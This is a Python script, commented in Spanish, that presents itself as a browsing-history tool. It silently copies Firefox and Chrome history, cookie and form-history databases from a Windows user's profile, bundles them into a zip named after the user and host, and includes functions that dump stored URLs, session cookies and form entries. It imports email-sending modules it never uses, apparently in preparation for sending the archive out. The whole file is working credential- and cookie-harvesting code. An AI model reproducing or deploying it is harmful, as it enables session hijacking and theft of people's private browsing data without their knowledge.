#!/usr/bin/python
#-*- coding: latin-1 -*-

#print("###############################################")
#print("########## HISTORIAL DE NAVEGACION ############")
#print("###############################################")

import os
import sqlite3
import shutil
import stat
import zipfile
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from smtplib import SMTP
from email import encoders
import socket
import time
from pathlib import Path

##################################################################
directorio_actual = os.getcwd()
directorio_raiz =  os.path.join(os.getcwd(), "/")
##################################################################
explorer = "\\AppData\\Local\\Microsoft\\Windows\\History"

def buscar_archivos():
    r = []
    a = []
    firefox_places = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
    chrome = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
    ##############################################################################
    ################ CREA UN DIRECTORIO PARA COPIAR LOS ARCHIVOS #################
    ##############################################################################

    directorio_prueba = os.path.expanduser('~')# Carpeta del usuario actual
    c = os.path.join(directorio_prueba, "Explorer")
    #print(c)
    if os.path.exists(c) == True:  # Si existe la carpeta pasa de largo
        pass
    else:
        os.chdir(directorio_prueba)
        os.mkdir("Explorer")  # Caso contrario la crea

    ##############################################################################
    ##################### BUSCA LOS ARCHIVOS Y LOS COPIA #########################
    ##############################################################################
    usuario = "C:\\Users\\" + os.getlogin() + firefox_places
    usuario2 = "C:\\Users\\" + os.getlogin() + chrome
    #usuario = "C:\\Users\\admin" + firefox_places
    #usuario2 = "C:\\Users\\admin" + chrome
    for ruta, carpeta, archivo in os.walk(usuario):
        r = ruta
        a = archivo
        k = len(a)
        if k > 20:
            for j in a:
                total = os.path.join(r, j)
                if ".sqlite" in total:
                    shutil.copy(total, c)

    for archivo2 in os.listdir(usuario2):

        r2 = usuario2
        a2 = archivo2
        k2 = len(a2)

        total2 = os.path.join(r2, a2)
        #if os.path.isfile(total2):
        if "History" in total2:
            shutil.copy(total2, c)
        if "Cookies" in total2:
            shutil.copy(total2, c)
        else:
            pass
    ##############################################################################
    ################# COMPRIME TODOS LOS ARCHIVOS COPIADOS #######################
    ##############################################################################
    host = socket.gethostname()
    nusuario = os.getlogin() +"-" + host + ".zip"
    archivo_zip = zipfile.ZipFile(os.path.join(c, nusuario), "w")
    for carpeta, subcarpetas, arcivos in os.walk(c):
        for arcivo in arcivos:
            archivo_zip.write(os.path.join(carpeta, arcivo), os.path.relpath(os.path.join(carpeta, arcivo), c), compress_type=zipfile.ZIP_DEFLATED)

            #-> Comprimir por Extencion
            #if arcivo.endswith(".sqlite"):
                #archivo_zip.write(os.path.join(carpeta, arcivo), os.path.relpath(os.path.join(carpeta, arcivo), c), compress_type=zipfile.ZIP_DEFLATED)

    archivo_zip.close()

##############################################################################
########## DESCIFRA EL HISTORIAL Y COOKIES DE LOS NAVEGADORES ################
##############################################################################
def chrome():
    chrome = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    usuario = "C:\\Users\\" + os.getlogin() + chrome
    #usuario = "C:\\Users\\admin\\" + chrome
    cmd = sqlite3.connect(usuario)
    registro = cmd.cursor()
    registro.execute('SELECT * FROM urls')
    dato = registro.fetchall()
    for j in dato:
        print(j)

def firefox():
    firefox_places = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\0uj9oll9.default-release\\places.sqlite"
    firefox_cookies = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\0uj9oll9.default-release\\cookies.sqlite"
    firefox_historial = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\0uj9oll9.default-release\\formhistory.sqlite"
    ##################################################################
    ######################### -> VISITAS #############################
    ##################################################################
    usuario_places = "C:\\Users\\" + os.getlogin() + firefox_places
    #usuario_places = "C:\\Users\\admin\\" + firefox_places
    cmd2 = sqlite3.connect(usuario_places)
    visita = cmd2.cursor()
    #visita.execute('SELECT name FROM sqlite_master WHERE type="table";') #-> Sentencia que permite ver todas las tablas de una DB
    visita.execute('SELECT moz_places.url, moz_places.visit_count FROM moz_places;')
    tvisita = visita.fetchall()

    ##################################################################
    ######################### -> COOKIES #############################
    ##################################################################
    # usuario = "C:\\Users\\" + os.getlogin() + firefox
    usuario_cookies = "C:\\Users\\admin\\" + firefox_cookies
    cmd3 = sqlite3.connect(usuario_cookies)
    cookies = cmd3.cursor()
    #cookies.execute('SELECT name FROM sqlite_master WHERE type="table";') #-> Sentencia que permite ver todas las tablas de una DB
    cookies.execute('SELECT * FROM moz_cookies')
    tcookies = cookies.fetchall()

    ##################################################################
    ######################## -> HISTORIAL ############################
    ##################################################################

    # usuario = "C:\\Users\\" + os.getlogin() + firefox
    usuario_historial = "C:\\Users\\admin\\" + firefox_historial
    cmd4 = sqlite3.connect(usuario_historial)
    historial = cmd4.cursor()
    #historial.execute('SELECT name FROM sqlite_master WHERE type="table";') #-> Sentencia que permite ver todas las tablas de una DB
    historial.execute('SELECT * FROM moz_formhistory')
    thistorial = historial.fetchall()

    for url, count in tvisita:
        #pass
        print(url)
    print("#############################################################################")
    print("#############################################################################")
    for cook in tcookies:
        #pass
        print(cook)
    print("#############################################################################")
    print("#############################################################################")
    for hist in thistorial:
        print(hist)

buscar_archivos()
#input("\nPrecione una tecla para continuar...")
